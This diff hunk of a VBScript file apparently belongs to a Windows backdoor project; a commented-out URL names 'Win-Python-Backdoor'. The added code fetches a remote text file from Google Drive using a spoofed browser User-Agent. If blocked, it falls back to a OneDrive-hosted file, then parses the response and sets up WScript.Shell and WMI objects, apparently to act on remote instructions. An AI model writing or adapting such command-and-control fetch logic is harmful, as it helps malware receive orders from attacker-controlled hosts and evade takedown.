@@ -3,15 +3,25 @@ set xmlhttp = createobject ("Msxml2.ServerXMLHTTP")
 dim url,mac
   'url="https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/"
   'url="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF"
-  'url="https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny"
-  url="https://onedrive.live.com/download.aspx?cid=7C80BDF021F1D245&authKey=%21AK7fmy%5FJWYJYexo&resid=7C80BDF021F1D245%213188&ithint=%2Etxt"
+  url="https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny"
+  'url="https://onedrive.live.com/download.aspx?cid=7C80BDF021F1D245&authKey=%21AK7fmy%5FJWYJYexo&resid=7C80BDF021F1D245%213188&ithint=%2Etxt"
 'msgbox  url&"site.txt"
 'xmlhttp.open "get", url&"site.txt", false
 
 xmlhttp.open "get", url, false
+
 xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
 xmlhttp.send
 strOutput = xmlhttp.responseText
+if (left(strOutput,6)="<HTML>") then
+    url="https://onedrive.live.com/download.aspx?cid=7C80BDF021F1D245&authKey=%21AK7fmy%5FJWYJYexo&resid=7C80BDF021F1D245%213188&ithint=%2Etxt"
+    xmlhttp.open "get", url, false
+
+    xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
+    xmlhttp.send
+    strOutput = xmlhttp.responseText
+end if
+'msgbox strOutput
 a=Split(strOutput,",")
 Set oShell = CreateObject ("WScript.Shell") 
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
